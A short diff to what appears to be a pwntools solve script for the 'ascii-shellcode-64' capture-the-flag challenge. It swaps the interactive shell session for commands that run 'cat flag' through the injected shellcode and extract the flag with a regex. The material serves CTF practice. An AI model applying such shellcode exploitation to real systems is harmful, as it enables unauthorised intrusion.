@@ -41,4 +41,9 @@ with open("shellcode.bin", "wb") as file:
     file.write(shellcode)
 
 io = process("./ascii-shellcode-64", env={})
-io.interactive()
+
+import re
+io.sendlineafter(b'Reading', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
+
